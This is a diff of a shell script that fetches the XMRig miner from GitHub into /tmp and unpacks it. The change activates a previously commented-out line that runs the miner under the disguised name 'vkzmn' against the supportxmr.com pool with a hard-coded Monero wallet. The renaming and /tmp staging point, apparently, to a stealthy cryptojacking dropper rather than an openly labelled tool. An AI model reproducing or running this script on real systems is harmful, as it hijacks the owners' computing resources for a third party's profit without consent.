@@ -7,6 +7,8 @@ md5_vkzmn='cf127d66124c390ca0f0b42c6385c3c8'
 down_wget(){
 
 
+
+
 wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz -O  /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
 gzip -df /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
 tar -xf /tmp/xmrig-6.25.0-linux-static-x64.tar -C /tmp                                 
@@ -62,7 +64,7 @@ echo   xmrig conhecido
 rm config.json
 
 
-#./vkzmn #--url  pool.supportxmr.com:3333  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1  
+./vkzmn   --url  pool.supportxmr.com:3333  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1  
  
 
 
